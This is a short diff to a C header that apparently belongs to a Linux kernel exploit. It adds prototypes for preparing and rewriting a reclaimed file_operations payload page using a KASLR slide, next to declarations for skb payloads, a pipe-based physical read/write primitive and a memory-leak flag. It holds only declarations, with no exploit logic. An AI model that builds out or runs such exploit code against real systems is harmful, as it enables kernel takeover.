@@ -329,6 +329,7 @@ extern uintptr_t fops_data_probe_addr;
 extern int fops_data_probe_active;
 extern int data_alias_uses_slide;
 extern int data_addr_canonical;
+extern int app_fops_reused_page_ready;
 extern int slide_p0_session_fresh;
 extern int memfd_leak;
 
@@ -376,6 +377,11 @@ void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+int prepare_reused_fops_payload(uintptr_t runtime_slide);
+int rewrite_reused_fops_payload(void);
+#endif
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
     !defined(SLIDE_STACK_WRITER)
@@ -468,6 +474,7 @@ int install_pipe_physrw(int fd);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
+int rewrite_p0_payload_page(const void *data, size_t size);
 int verify_p0_pipe_oracle_gate(void);
 int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
 uintptr_t scan_p0_pipe_oracle(void);
